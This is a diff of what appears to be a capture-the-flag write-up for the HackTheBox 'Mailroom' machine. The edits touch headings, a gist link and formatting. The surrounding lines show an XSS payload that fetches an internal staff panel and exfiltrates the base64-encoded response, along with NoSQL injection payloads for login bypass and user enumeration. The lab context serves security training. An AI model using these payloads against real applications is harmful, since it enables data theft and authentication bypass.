@@ -219,7 +219,7 @@ The user sitemap gives three usernames,
 
 ---
 
-### Exfiltrating data using XXS (XSRF?)
+### Exfiltrating data using XXS
 
 Since the staff site is forbidden when accessed internally, maybe it can be accessed using the XSS vulnerability on the contact page. A payload like this works. Additionally, the data must be base64 encoded, as it is being exfiltrated as an HTTP parameter.
 
@@ -237,7 +237,7 @@ fetch("http://staff-review-panel.mailroom.htb").then((r) =>
 );
 ```
 
-I developed a [small Flask application](<gist goes here>) to automate the decoding process for each reques. Using the payload returns the source for the staff review site.
+I developed a [small Flask application](https://gist.github.com/AbraXa5/f8f7e0a6caec4c7a5eb6c426a575923b#file-xxs_exfil-py) to automate the decoding process for each reques. Using the payload returns the source for the staff review site.
 
 ```bash
 > python xss_exfil.py
@@ -341,8 +341,7 @@ Investigating the new `/auth.php` endpoint based on this new info. Given that th
 
 Modified the previous script to conduct a test for NoSQLi. The main payload here is `email[$ne]=abraxas&password[$ne]=abraxas`. Given the extremely remote possibility of an existing user with these credentials, a positive response from this query will confirm NoSQL injection.
 
-`nosqli.js`
-
+_nosqli.js_
 ```js
 // var formData = "email[$exists]=true&password[$exists]=true";
 var formData = "email[$ne]=abraxas&password[$ne]=abraxas";
@@ -389,8 +388,7 @@ Using the same Flask app as before, the decoded text indicates that the request 
 
 There are actually two JSON responses here, one of which is invalid and the next is successful because the invalid response lacks an exit statement, allowing the remainder code to execute. Testing the three usernames found on the Gitea sitemap. Since the login page needs an email, appending `@mailroom.htb` to the usernames.
 
-`user_enum.js`
-
+_user_enum.js_
 ```js
 // var formData = "email[$eq]=administrator@mailroom.htb&password[$exists]=true";
 var formData = "email[$eq]=tristan@mailroom.htb&password[$exists]=true";
